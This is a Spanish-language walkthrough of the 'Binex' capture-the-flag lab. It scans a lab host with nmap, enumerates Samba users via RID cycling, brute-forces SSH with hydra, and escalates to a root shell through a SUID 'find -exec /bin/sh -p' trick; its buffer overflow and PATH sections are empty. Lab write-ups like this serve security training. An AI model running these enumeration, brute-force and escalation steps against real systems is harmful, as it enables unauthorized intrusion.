# Binex

## Tabla de contenido

- [Gain initial access](#Gain-initial-access).
- [SUID :: Binary 1](#SUID-::-Binary-1).
- [Buffer Overflow :: Binary 2](#Buffer-Overflow-::-Binary-2).
- [PATH Manipulation :: Binary 3](#PATH-Manipulation-::-Binary-3).


----------------------------------------
### Gain initial access
---------------------------------------

Hacemos un escaneo general para poder ver los servicios y puertos que utiliza:
```
mkdir nmap
nmap -sC -sV -oN nmap/initial 10.10.78.222
```
El resultado generado es el siguiente:

```
Nmap scan report for ip-10-10-78-222.eu-west-1.compute.internal (10.10.78.222)
Host is up (0.0016s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3f:36:de:da:2f:c3:b7:78:6f:a9:25:d6:41:dd:54:69 (RSA)
|   256 d0:78:23:ee:f3:71:58:ae:e9:57:14:17:bb:e3:6a:ae (ECDSA)
|_  256 4c:de:f1:49:df:21:4f:32:ca:e6:8e:bc:6a:96:53:e5 (EdDSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:F0:4C:68:F6:BF (Unknown)
Service Info: Host: THM_EXPLOIT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: THM_EXPLOIT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: thm_exploit
|   NetBIOS computer name: THM_EXPLOIT\x00
|   Domain name: \x00
|   FQDN: thm_exploit
|_  System time: 2020-11-12T00:12:19+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-12 00:12:19
|_  start_date: 1600-12-31 23:58:45

```
Descargamos el script enum4linux para enumerar datos de hosts Samba.

```
git clone https://github.com/CiscoCXSecurity/enum4linux.git
./enum4linux.pl -R 1000-1003 10.10.78.222
```
El resultado obtenido es: 
```
 =============================================================== 
|    Users on 10.10.78.222 via RID cycling (RIDS: 1000-1003)    |
 =============================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2007993849-1719925537-2372789573
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-2007993849-1719925537-2372789573 and logon username '', password ''
S-1-5-21-2007993849-1719925537-2372789573-1000 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1001 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1002 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1003 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kel (Local User)
S-1-22-1-1001 Unix User\des (Local User)
S-1-22-1-1002 Unix User\********* (Local User)
S-1-22-1-1003 Unix User\noentry (Local User)
enum4linux complete on Thu Nov 12 02:05:21 2020
```

Utilizamos fuerza bruta para obtener la contraseña del usuario encontrado:
```
hydra -l ********* -P /usr/share/wordlists/rockyou.txt 10.10.78.222 -t 4 ssh
```

```
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2020-11-12 02:13:30
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking ssh://10.10.78.222:22/

[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344334 to do in 3735:31h, 4 active
[STATUS] 61.33 tries/min, 184 tries in 00:03h, 14344214 to do in 3897:54h, 4 active
[STATUS] 60.57 tries/min, 424 tries in 00:07h, 14343974 to do in 3946:51h, 4 active

[22][ssh] host: 10.10.78.222   login: *********   password: *******
```

----------------------------------------
### SUID :: Binary 1
---------------------------------------

Utilizamos el comando "find" para poder filtrar los SUID
```
find / -perm -u=s -type f 2>/dev/null
```
El resultado:
```
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/7270/bin/mount
/snap/core/7270/bin/ping
/snap/core/7270/bin/ping6
/snap/core/7270/bin/su
/snap/core/7270/bin/umount
/snap/core/7270/usr/bin/chfn
/snap/core/7270/usr/bin/chsh
/snap/core/7270/usr/bin/gpasswd
/snap/core/7270/usr/bin/newgrp
/snap/core/7270/usr/bin/passwd
/snap/core/7270/usr/bin/sudo
/snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7270/usr/lib/openssh/ssh-keysign
/snap/core/7270/usr/lib/snapd/snap-confine
/snap/core/7270/usr/sbin/pppd
/home/des/bof
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/find
/usr/bin/chsh
/usr/bin/at
/usr/bin/pkexec
/usr/bin/newgrp
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
/bin/ping
```

Buscamos en la página https://gtfobins.github.io/

Utilizamos el comando:
```
./find . -exec /bin/sh -p \; -quit
```

----------------------------------------
### Buffer Overflow :: Binary 2
---------------------------------------


----------------------------------------
### PATH Manipulation :: Binary 3
---------------------------------------
